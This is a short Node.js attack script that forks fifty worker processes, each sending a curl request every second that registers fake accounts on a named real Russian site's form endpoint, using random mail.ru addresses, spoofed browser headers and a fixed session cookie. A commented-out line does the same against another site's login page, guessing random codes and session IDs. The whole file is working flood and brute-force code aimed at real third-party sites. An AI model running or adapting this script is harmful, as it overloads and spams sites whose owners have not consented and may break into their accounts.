function randomString(len, charSet) {
    charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var randomString = '';
    for (var i = 0; i < len; i++) {
        var randomPoz = Math.floor(Math.random() * charSet.length);
        randomString += charSet.substring(randomPoz,randomPoz+1);
    }
    return randomString;
}

const cluster=require('cluster');

if(cluster.isMaster)
    for(let i=0;i<50;i++)
        cluster.fork();
else
    setInterval(()=>{
        require('child_process').execSync(`curl 'http://poster-live.ru/action_ajax_form.php' -H 'Pragma: no-cache' -H 'Origin: http://poster-live.ru' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: PHPSESSID=mb02dbe1v36ueljnqgniv6s4t3' -H 'Connection: keep-alive' -H 'Referer: http://poster-live.ru/' --data 'email2=${randomString(50)}%40mail.ru&password2=123123123123&password22=123123123123' --compressed`)
    },1000)

//`curl 'https://foxyweb.ru/login.php?code=${randomString(18,'0123456789abcdef')}' -H 'Pragma: no-cache' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Cookie: jv_enter_ts_UWzjl3OCte=1503160385505; jv_visits_count_UWzjl3OCte=1; jv_utm_UWzjl3OCte=; PHPSESSID=${randomString(26,'0123456789abcdefghijklmnopqrstuvwxyz')}' -H 'Connection: keep-alive' --compressed`)
